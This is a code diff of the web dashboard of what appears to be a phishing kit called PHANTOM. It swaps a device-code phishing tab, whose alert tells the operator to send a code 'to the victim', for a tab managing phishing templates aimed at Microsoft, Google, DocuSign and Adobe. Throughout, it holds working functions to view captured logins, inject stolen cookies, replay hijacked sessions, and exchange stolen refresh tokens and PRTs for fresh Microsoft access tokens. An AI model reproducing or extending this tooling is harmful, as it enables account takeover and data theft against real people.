@@ -153,50 +153,7 @@
             box-shadow: 0 0 12px #c92a2a;
         }
 
-        .ws-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            transition: all 0.3s ease;
-        }
-
-        .ws-dot.online {
-            background: #69db7c;
-            box-shadow: 0 0 12px #69db7c;
-            animation: pulse-green 1.5s infinite;
-        }
-
-        .ws-dot.offline {
-            background: #ff6b6b;
-            box-shadow: 0 0 12px #ff6b6b;
-            animation: pulse-red 1.5s infinite;
-        }
-
-        .ws-dot.polling {
-            background: #ffd700;
-            box-shadow: 0 0 12px #ffd700;
-            animation: pulse-yellow 1.5s infinite;
-        }
-
-        @keyframes pulse-green {
-            0% { box-shadow: 0 0 0 0 rgba(105, 219, 124, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(105, 219, 124, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(105, 219, 124, 0); }
-        }
-
-        @keyframes pulse-red {
-            0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
-        }
-
-        @keyframes pulse-yellow {
-            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 215, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
-        }
-
+        /* ----- Tabs ----- */
         .tabs {
             display: flex;
             gap: 4px;
@@ -270,7 +227,6 @@
             display: flex;
             gap: 12px;
             align-items: center;
-            flex-wrap: wrap;
         }
 
         .btn {
@@ -417,6 +373,23 @@
             display: flex;
             align-items: center;
             gap: 6px;
+        }
+
+        .ws-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .ws-dot.online {
+            background: #69db7c;
+            box-shadow: 0 0 12px #69db7c;
+        }
+
+        .ws-dot.offline {
+            background: #ff6b6b;
+            box-shadow: 0 0 12px #ff6b6b;
         }
 
         .table-wrap {
@@ -677,7 +650,7 @@
             border-color: rgba(0, 0, 0, 0.1) !important;
         }
 
-        /* Toggle switch – kept for potential future use, but no phishlets now */
+        /* Toggle switch for phishlets */
         .switch {
             position: relative;
             display: inline-block;
@@ -727,7 +700,6 @@
         <div class="header-actions">
             <button class="btn" onclick="toggleTheme()">🌓 Theme</button>
             <button class="btn btn-primary" onclick="exportAll()">📦 Export ZIP</button>
-            <button class="btn" onclick="window.open('/device','_blank')" style="border-color: rgba(255,215,0,0.3); color: #ffd700;">📱 Device Code</button>
         </div>
     </header>
 
@@ -768,12 +740,12 @@
         </div>
     </div>
 
-    <!-- Tabs (Phishlets removed) -->
+    <!-- Tabs -->
     <div class="tabs glass">
         <div class="tab active" data-tab="dashboard" onclick="switchTab('dashboard')">📊 Dashboard</div>
         <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
         <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
-        <div class="tab" data-tab="device" onclick="switchTab('device')" style="border-color: rgba(255,215,0,0.2); color: #ffd700;">📱 Device Code</div>
+        <div class="tab" data-tab="phishlets" onclick="switchTab('phishlets')">🎭 Phishlets</div>
     </div>
 
     <!-- ==================== TAB: Dashboard ==================== -->
@@ -787,7 +759,7 @@
             </select>
             <button class="btn" onclick="refreshLogs()">🔄 Refresh</button>
             <div class="ws-status">
-                <span class="ws-dot" id="wsDot"></span>
+                <span class="ws-dot offline" id="wsDot"></span>
                 <span id="wsLabel">Connecting...</span>
             </div>
         </div>
@@ -883,49 +855,19 @@
         </div>
     </div>
 
-    <!-- ==================== TAB: Device Code ==================== -->
-    <div id="tab-device" class="tab-content">
+    <!-- ==================== TAB: Phishlets ==================== -->
+    <div id="tab-phishlets" class="tab-content">
         <div class="toolbar glass">
-            <button class="btn btn-primary" onclick="startDeviceFlow()">🚀 Start New Flow</button>
-            <button class="btn" onclick="refreshDeviceHistory()">🔄 Refresh</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="deviceStats">📊 0 flows · 0 approved</span>
+            <button class="btn btn-primary" onclick="loadPhishlets()">🔄 Refresh</button>
+            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);">Manage phishing templates</span>
         </div>
-
-        <div class="stats">
-            <div class="stat-card glass">
-                <label>Active Flows</label>
-                <div class="value" id="activeFlows">0</div>
-                <div class="sub">Waiting for approval</div>
-            </div>
-            <div class="stat-card glass">
-                <label>Approved</label>
-                <div class="value" id="approvedFlows">0</div>
-                <div class="sub">Successful captures</div>
-            </div>
-            <div class="stat-card glass">
-                <label>Expired</label>
-                <div class="value" id="expiredFlows">0</div>
-                <div class="sub">Codes expired</div>
-            </div>
-        </div>
-
         <div class="table-wrap glass" style="padding: 8px;">
             <table>
-                <thead><tr><th>Code</th><th>Status</th><th>Created</th><th>Approved</th><th>Token Type</th><th>Actions</th></tr></thead>
-                <tbody id="deviceHistoryTable">
-                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows yet. Click "Start New Flow" to begin.</td></tr>
+                <thead><tr><th>Name</th><th>Icon</th><th>File</th><th>Entry Point</th><th>Status</th><th>Actions</th></tr></thead>
+                <tbody id="phishletsTable">
+                    <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">Loading phishlets...</td></tr>
                 </tbody>
             </table>
-        </div>
-
-        <div class="glass" style="padding: 16px; margin-top: 16px;">
-            <h4 style="color: rgba(255,255,255,0.5); font-weight: 400; margin-bottom: 8px;">🔧 Manual Code Generator</h4>
-            <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
-                <input type="text" id="manualCode" placeholder="Enter custom code (e.g., ABC123)" style="flex:1; min-width:200px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1); border-radius:40px; padding:8px 18px; color:#e0e8f0; outline:none;">
-                <button class="btn btn-warning" onclick="generateManualCode()">🔑 Generate</button>
-                <button class="btn" onclick="copyManualCode()">📋 Copy</button>
-            </div>
-            <div id="manualCodeResult" style="margin-top:8px; font-size:14px; color:rgba(255,255,255,0.4);"></div>
         </div>
     </div>
 </div>
@@ -950,16 +892,10 @@
     let map = null;
     let chart = null;
     let analyticsChart = null;
-    let vaultTokens = [];
-    let deviceHistory = [];
-    let deviceInterval;
-    let ws = null;
-    let wsReconnectTimer = null;
-    let wsConnected = false;
-    let pendingLogsRefresh = false;
-    let isFallbackMode = false;
     let reconnectAttempts = 0;
-    const maxReconnectAttempts = 10;
+    const maxReconnectAttempts = 20;
+    let ws;
+    let vaultTokens = [];
 
     // =============================================
     // THEME
@@ -987,141 +923,65 @@
         
         if (tabId === 'vault') loadVault();
         if (tabId === 'analytics') loadAnalytics();
-        if (tabId === 'device') {
-            refreshDeviceHistory();
-            if (deviceInterval) clearInterval(deviceInterval);
-            deviceInterval = setInterval(refreshDeviceHistory, 10000);
-        } else {
-            if (deviceInterval) clearInterval(deviceInterval);
-        }
+        if (tabId === 'phishlets') loadPhishlets();
     }
 
     // =============================================
-    // WEBSOCKET - RAILWAY COMPATIBLE
+    // WEBSOCKET
     // =============================================
     function connectWebSocket() {
-        const isCloudPlatform = window.location.hostname.includes('railway.app') || 
-                                 window.location.hostname.includes('up.railway.app') ||
-                                 window.location.hostname.includes('onrender.com') ||
-                                 window.location.hostname.includes('fly.io') ||
-                                 window.location.hostname.includes('herokuapp.com');
-        
+        const wsProtocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
+        ws = new WebSocket(wsProtocol + location.host);
         const wsDot = document.getElementById('wsDot');
         const wsLabel = document.getElementById('wsLabel');
-        
-        // 🚂 Cloud platform detection - use polling fallback
-        if (isCloudPlatform) {
-            console.log('🚂 Cloud platform detected - using polling fallback');
-            wsDot.className = 'ws-dot polling';
-            wsLabel.textContent = '🔄 Polling (15s)';
-            isFallbackMode = true;
-            showToast('🔄 Using polling mode (updates every 15s)', false);
-            return;
-        }
-        
-        // Try WebSocket for local/dev environments
-        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-        const wsUrl = wsProtocol + window.location.host + '/ws';
-        
-        console.log('🔌 Connecting to WebSocket:', wsUrl);
-        
-        try {
-            ws = new WebSocket(wsUrl);
-            
-            ws.onopen = () => {
-                wsConnected = true;
-                isFallbackMode = false;
-                reconnectAttempts = 0;
-                const dot = document.getElementById('wsDot');
-                const label = document.getElementById('wsLabel');
-                dot.className = 'ws-dot online';
-                label.textContent = '🟢 Live (WebSocket)';
-                console.log('✅ WebSocket connected');
-                showToast('🟢 Real-time connection established');
-                refreshLogs();
-            };
-            
-            ws.onmessage = (event) => {
-                try {
-                    const data = JSON.parse(event.data);
-                    console.log('📩 WebSocket message:', data);
-                    
-                    switch(data.type) {
-                        case 'connected':
-                            console.log('✅ WebSocket handshake complete');
-                            break;
-                        case 'new_log':
-                            if (!pendingLogsRefresh) {
-                                pendingLogsRefresh = true;
-                                setTimeout(() => { refreshLogs(); pendingLogsRefresh = false; }, 500);
-                            }
-                            break;
-                        case 'new_visit':
-                            fetchVisits();
-                            break;
-                        case 'new_capture':
-                            showToast(`🔐 New capture: ${data.data?.email || 'Unknown user'}`);
-                            refreshLogs();
-                            break;
-                        case 'device_update':
-                            refreshDeviceHistory();
-                            break;
-                        case 'ping':
-                            if (ws && ws.readyState === WebSocket.OPEN) {
-                                ws.send(JSON.stringify({ type: 'pong' }));
-                            }
-                            break;
-                        default:
-                            console.log('Unknown WebSocket message type:', data.type);
-                    }
-                } catch (e) {
-                    console.error('WebSocket message error:', e);
-                }
-            };
-            
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-                // If connection fails, fallback to polling
-                if (!isFallbackMode) {
-                    wsDot.className = 'ws-dot offline';
-                    wsLabel.textContent = '⚠️ Polling (15s)';
-                    isFallbackMode = true;
-                    showToast('⚠️ WebSocket unavailable - using polling', true);
-                }
-            };
-            
-            ws.onclose = () => {
-                wsConnected = false;
-                const dot = document.getElementById('wsDot');
-                const label = document.getElementById('wsLabel');
-                dot.className = 'ws-dot offline';
-                label.textContent = '🔴 Reconnecting...';
-                console.log('WebSocket disconnected, reconnecting in 3s...');
-                
-                if (reconnectAttempts < maxReconnectAttempts) {
-                    reconnectAttempts++;
-                    const delay = Math.min(3000 + reconnectAttempts * 1000, 15000);
-                    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
-                    wsReconnectTimer = setTimeout(connectWebSocket, delay);
-                } else {
-                    dot.className = 'ws-dot polling';
-                    label.textContent = '🔄 Polling (15s)';
-                    isFallbackMode = true;
-                    showToast('⚠️ WebSocket reconnection failed - using polling', true);
-                }
-            };
-        } catch (e) {
-            console.error('WebSocket connection failed:', e);
+
+        ws.onopen = () => {
+            wsDot.className = 'ws-dot online';
+            wsLabel.textContent = 'Live';
+            reconnectAttempts = 0;
+            startHeartbeat();
+        };
+
+        ws.onclose = () => {
             wsDot.className = 'ws-dot offline';
-            wsLabel.textContent = '⚠️ Polling (15s)';
-            isFallbackMode = true;
-            showToast('⚠️ WebSocket error - using polling', true);
-        }
+            wsLabel.textContent = 'Disconnected';
+            if (reconnectAttempts < maxReconnectAttempts) {
+                reconnectAttempts++;
+                const delay = Math.min(5000 + reconnectAttempts * 1000, 30000);
+                console.log(`🔄 Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts}) in ${delay/1000}s`);
+                setTimeout(connectWebSocket, delay);
+            }
+        };
+
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+        };
+
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                if (data.type === 'newLog') {
+                    showToast('📥 New capture: ' + data.file);
+                    refreshLogs();
+                } else if (data === 'pong') {
+                    // Heartbeat response
+                }
+            } catch (e) {
+                // Not JSON, ignore
+            }
+        };
     }
 
-    // =============================================
-    // TOAST NOTIFICATIONS
-    // =============================================
+    let heartbeatInterval;
+    function startHeartbeat() {
+        if (heartbeatInterval) clearInterval(heartbeatInterval);
+        heartbeatInterval = setInterval(() => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send('ping');
+            }
+        }, 25000);
+    }
+
     function showToast(msg, isError = false) {
         const container = document.getElementById('toastContainer');
         const toast = document.createElement('div');
@@ -1152,11 +1012,11 @@
             allLogs = logs;
             renderTable(logs);
             updateStats(logs);
-            updateMap();
+            updateMap(logs);
             updateChart(logs);
             await fetchVisits();
         } catch (e) {
-            console.error('Failed to fetch logs:', e);
+            showToast('Failed to fetch logs: ' + e.message, true);
         }
     }
 
@@ -1231,7 +1091,7 @@
                 const ipCell = document.getElementById(`ip-${filename}`);
                 if (ipCell) ipCell.textContent = ip;
             }
-        } catch (e) { /* ignore */ }
+        } catch (e) { /* silently fail */ }
     }
 
     function updateStats(logs) {
@@ -1243,13 +1103,18 @@
         }
     }
 
-    function updateMap() {
+    function updateMap(logs) {
         if (!map) {
             map = L.map('map').setView([20, 0], 2);
             L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                 attribution: '&copy; OpenStreetMap, &copy; CartoDB'
             }).addTo(map);
         }
+        map.eachLayer(layer => {
+            if (layer instanceof L.Marker) map.removeLayer(layer);
+        });
+        L.marker([20, 0]).addTo(map)
+            .bindPopup('📍 IP locations will appear here once you have captures.');
     }
 
     function updateChart(logs) {
@@ -1337,7 +1202,7 @@
     }
 
     // =============================================
-    // VIEW LOG
+    // VIEW LOG - FIXED
     // =============================================
     async function viewLog(filename) {
         const modal = document.getElementById('modal');
@@ -1388,7 +1253,7 @@
     }
 
     // =============================================
-    // INJECT COOKIES
+    // INJECT COOKIES - FIXED
     // =============================================
     async function injectCookies(filename) {
         try {
@@ -1418,9 +1283,9 @@
             const cookieString = allCookies.join('; ');
             try {
                 await navigator.clipboard.writeText(cookieString);
-                showToast(`🍪 ${allCookies.length} cookies copied to clipboard.`);
+                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
             } catch (e) {
-                showToast('Manual copy: ' + cookieString);
+                showToast('Failed to copy. Manual: ' + cookieString);
             }
         } catch (e) {
             showToast('Error: ' + e.message, true);
@@ -1428,7 +1293,7 @@
     }
 
     // =============================================
-    // REPLAY SESSION
+    // REPLAY SESSION - FIXED
     // =============================================
     async function replaySession(filename) {
         try {
@@ -1441,7 +1306,7 @@
                 return;
             }
             eval(data.replayScript);
-            showToast(`✅ ${data.cookieCount} cookies injected.`);
+            showToast(`✅ ${data.cookieCount} cookies injected. Redirecting...`);
         } catch (e) {
             showToast('❌ Replay error: ' + e.message, true);
         }
@@ -1468,10 +1333,13 @@
             msg += `  • Cookies: ${tokens.cookies.length}\n`;
             msg += `  • Sessions: ${tokens.sessions.length}`;
             
-            if (tokens.prt_tokens && tokens.prt_tokens.length > 0) {
+            const hasPrt = tokens.prt || tokens.flowToken;
+            if (hasPrt) {
                 msg += `\n\n🔑 **PRT Found!** (Long-term access)`;
+                msg += `\n   📝 Length: ${(tokens.prt || tokens.flowToken).length} chars`;
+                msg += `\n\n   💡 Click OK to exchange PRT for a fresh access token.`;
                 if (confirm(msg + '\n\nExchange PRT for a new access token?')) {
-                    await exchangePRT(tokens.prt_tokens[0]);
+                    await exchangePRT(tokens.prt || tokens.flowToken);
                     return;
                 }
             }
@@ -1490,16 +1358,16 @@
 
     async function exchangeRefreshToken(refreshToken) {
         try {
-            const response = await fetch('/dash/api/vault/exchange', {
+            const response = await fetch('/dash/api/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ tokenValue: refreshToken })
+                body: JSON.stringify({ refresh_token: refreshToken })
             });
             const data = await response.json();
-            if (data.success && data.data && data.data.access_token) {
+            if (data.access_token) {
                 showToast(`✅ New access token obtained.`);
-                localStorage.setItem('evil_token', JSON.stringify(data.data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
             } else {
                 showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1508,18 +1376,18 @@
         }
     }
 
-    async function exchangePRT(prt) {
+    async function exchangePRT(token) {
         try {
             const response = await fetch('/dash/api/prt/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ prt })
+                body: JSON.stringify({ prt: token })
             });
             const data = await response.json();
-            if (data.success && data.data && data.data.access_token) {
+            if (data.access_token) {
                 showToast(`✅ PRT exchange successful!`);
-                localStorage.setItem('evil_token', JSON.stringify(data.data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
             } else {
                 showToast('❌ PRT exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1583,7 +1451,7 @@
             const res = await fetch('/dash/api/vault/healthcheck', { method: 'POST' });
             const data = await res.json();
             if (data.success) {
-                const valid = data.results.filter(r => r.status === 'valid').length;
+                const valid = data.results.filter(r => r.result.valid).length;
                 showToast(`✅ ${valid} valid tokens, ${data.results.length - valid} expired.`);
                 loadVault();
             }
@@ -1604,7 +1472,7 @@
             if (statsData.success) {
                 const s = statsData.stats;
                 document.getElementById('vaultStats').textContent = 
-                    `📊 ${s.total} tokens · ${s.access} access · ${s.refresh} refresh · ${s.prt} PRT`;
+                    `📊 ${s.total} tokens · ${s.valid} valid · ${s.expired} expired · ${s.unknown} unknown`;
             }
             
             const tbody = document.getElementById('vaultTable');
@@ -1620,18 +1488,19 @@
                 const statusLabel = token.status === 'valid' ? '✅ Valid' : 
                                    token.status === 'expired' ? '❌ Expired' : '⚠️ Unknown';
                 const typeMap = {
-                    'access': '🔑 Access',
-                    'refresh': '🔄 Refresh',
-                    'id': '🆔 ID',
-                    'prt': '🔐 PRT'
+                    'access_token': '🔑 Access',
+                    'refresh_token': '🔄 Refresh',
+                    'id_token': '🆔 ID',
+                    'prt': '🔐 PRT',
+                    'flow_token': '🌊 Flow'
                 };
                 const typeDisplay = typeMap[token.type] || token.type;
-                const time = token.timestamp ? new Date(token.timestamp).toLocaleString() : 'N/A';
+                const time = new Date(token.timestamp).toLocaleString();
                 row.innerHTML = `
-                    <td><span style="font-weight:500;">${token.username || 'Unknown'}</span></td>
+                    <td><span style="font-weight:500;">${token.username}</span></td>
                     <td><span class="badge badge-info">${typeDisplay}</span></td>
                     <td><span class="badge ${statusClass}">${statusLabel}</span></td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.file || 'N/A'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.sourceFile || 'N/A'}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.4);">${time}</td>
                     <td>
                         <button class="action-btn token" onclick="exchangeVaultToken('${token.value}')">🔄 Exchange</button>
@@ -1654,7 +1523,7 @@
                 body: JSON.stringify({ tokenValue })
             });
             const data = await res.json();
-            if (data.success && data.data && data.data.access_token) {
+            if (data.success) {
                 showToast(`✅ New access token obtained!`);
                 localStorage.setItem('evil_token', JSON.stringify(data.data));
                 window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
@@ -1761,164 +1630,66 @@
     }
 
     // =============================================
-    // DEVICE CODE TAB
+    // PHISHLETS TAB
     // =============================================
-    function startDeviceFlow() {
-        showToast('🚀 Starting new device flow...');
-        window.open('/device', '_blank');
-        setTimeout(refreshDeviceHistory, 3000);
-    }
-
-    async function refreshDeviceHistory() {
+    async function loadPhishlets() {
         try {
-            const res = await fetch('/dash/api/device/history');
+            const res = await fetch('/dash/api/phishlets');
             const data = await res.json();
             if (!data.success) return;
-            deviceHistory = data.flows || [];
-            renderDeviceTable();
-            updateDeviceStats();
-        } catch (e) {
-            console.error('Failed to fetch device history:', e);
-        }
-    }
-
-    function renderDeviceTable() {
-        const tbody = document.getElementById('deviceHistoryTable');
-        if (deviceHistory.length === 0) {
-            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No device flows yet. Click "Start New Flow" to begin.</td></tr>`;
-            return;
-        }
-        tbody.innerHTML = '';
-        deviceHistory.slice(0, 50).forEach(flow => {
-            const row = document.createElement('tr');
-            const statusColors = {
-                'pending': 'badge-warning',
-                'approved': 'badge-success',
-                'expired': 'badge-danger'
-            };
-            const statusLabels = {
-                'pending': '⏳ Pending',
-                'approved': '✅ Approved',
-                'expired': '❌ Expired'
-            };
-            const statusClass = statusColors[flow.status] || 'badge';
-            const statusLabel = statusLabels[flow.status] || flow.status;
-            const created = new Date(flow.created).toLocaleString();
-            const approved = flow.approved ? new Date(flow.approved).toLocaleString() : '—';
-            
-            let actionsHtml = '';
-            if (flow.status === 'pending') {
-                actionsHtml += `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>`;
+            const phishlets = data.phishlets;
+            const tbody = document.getElementById('phishletsTable');
+            if (!phishlets || Object.keys(phishlets).length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No phishlets configured.</td></tr>`;
+                return;
             }
-            if (flow.access_token) {
-                actionsHtml += `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>`;
-            }
-            actionsHtml += `<button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>`;
-            
-            row.innerHTML = `
-                <td><span style="font-family:monospace; font-weight:600; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">${flow.user_code}</span></td>
-                <td><span class="badge ${statusClass}">${statusLabel}</span></td>
-                <td style="font-size:12px; color:rgba(255,255,255,0.4);">${created}</td>
-                <td style="font-size:12px; color:rgba(255,255,255,0.4);">${approved}</td>
-                <td><span class="badge badge-info">${flow.token_type || 'N/A'}</span></td>
-                <td>${actionsHtml}</td>
-            `;
-            tbody.appendChild(row);
-        });
-    }
-
-    function updateDeviceStats() {
-        const total = deviceHistory.length;
-        const pending = deviceHistory.filter(f => f.status === 'pending').length;
-        const approved = deviceHistory.filter(f => f.status === 'approved').length;
-        const expired = deviceHistory.filter(f => f.status === 'expired').length;
-        document.getElementById('activeFlows').textContent = pending;
-        document.getElementById('approvedFlows').textContent = approved;
-        document.getElementById('expiredFlows').textContent = expired;
-        document.getElementById('deviceStats').textContent = `📊 ${total} flows · ${approved} approved`;
-    }
-
-    function showDeviceCode(code) {
-        alert(`📱 Device Code: ${code}\n\nSend this to the victim to enter on their device.`);
-    }
-
-    function copyDeviceCode(code) {
-        navigator.clipboard.writeText(code);
-        showToast(`📋 Code "${code}" copied!`);
-    }
-
-    function generateManualCode() {
-        const input = document.getElementById('manualCode');
-        let code = input.value.trim().toUpperCase();
-        if (!code) {
-            code = Math.random().toString(36).substring(2, 8).toUpperCase();
-        }
-        fetch('/dash/api/device/manual', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user_code: code })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.success) {
-                document.getElementById('manualCodeResult').innerHTML = `
-                    ✅ Code <strong style="font-family:monospace;background:rgba(255,215,0,0.1);padding:2px 8px;border-radius:4px;">${code}</strong> generated!
-                    <span style="color:rgba(255,255,255,0.3);margin-left:8px;">Waiting for device approval...</span>
+            tbody.innerHTML = '';
+            Object.entries(phishlets).forEach(([id, p]) => {
+                const row = document.createElement('tr');
+                const iconMap = { 'microsoft': '🪟', 'google': '🔴', 'docusign': '📄', 'adobe': '🎨' };
+                const icon = iconMap[id] || '📄';
+                row.innerHTML = `
+                    <td><strong>${p.name}</strong></td>
+                    <td style="font-size:20px;">${icon}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${p.file}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${p.entryPoint}</td>
+                    <td><span class="badge ${p.enabled ? 'badge-success' : 'badge-danger'}">${p.enabled ? '✅ Enabled' : '❌ Disabled'}</span></td>
+                    <td>
+                        <label class="switch">
+                            <input type="checkbox" ${p.enabled ? 'checked' : ''} onchange="togglePhishlet('${id}', this.checked)">
+                            <span class="slider"></span>
+                        </label>
+                    </td>
                 `;
-                showToast(`✅ Code "${code}" generated!`);
-                refreshDeviceHistory();
-            } else {
-                document.getElementById('manualCodeResult').innerHTML = `❌ ${data.error || 'Generation failed'}`;
-            }
-        })
-        .catch(e => {
-            document.getElementById('manualCodeResult').innerHTML = `❌ Error: ${e.message}`;
-        });
-    }
-
-    function copyManualCode() {
-        const result = document.getElementById('manualCodeResult').innerHTML;
-        const match = result.match(/<strong[^>]*>([A-Z0-9]+)<\/strong>/);
-        if (match) {
-            navigator.clipboard.writeText(match[1]);
-            showToast(`📋 Code "${match[1]}" copied!`);
-        } else {
-            showToast('⚠️ Generate a code first!', true);
+                tbody.appendChild(row);
+            });
+        } catch (e) {
+            console.error('Failed to load phishlets:', e);
         }
     }
 
-    async function useDeviceToken(sessionId) {
+    async function togglePhishlet(id, enabled) {
         try {
-            const res = await fetch('/dash/api/device/use', {
+            const res = await fetch('/dash/api/phishlets/toggle', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ session_id: sessionId })
+                body: JSON.stringify({ id, enabled })
             });
             const data = await res.json();
-            if (data.success && data.access_token) {
-                showToast(`✅ Token obtained! Opening Graph Explorer...`);
-                localStorage.setItem('evil_token', JSON.stringify(data));
-                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
-            } else {
-                showToast('❌ Failed to use token: ' + (data.error || 'Unknown'), true);
+            if (data.success) {
+                showToast(`✅ ${id} ${enabled ? 'enabled' : 'disabled'}`);
+                loadPhishlets();
             }
         } catch (e) {
-            showToast('❌ Error: ' + e.message, true);
+            showToast('❌ Failed to toggle phishlet: ' + e.message, true);
         }
     }
 
     // =============================================
     // INIT
     // =============================================
-    console.log('🚀 PHANTOM Dashboard initializing...');
-    
-    // Connect WebSocket (will auto-detect Railway and use polling)
     connectWebSocket();
-    
-    // Initial data load
     refreshLogs();
-    
-    // Periodic refresh - always runs (polling fallback)
     setInterval(refreshLogs, 15000);
 </script>
 </body>
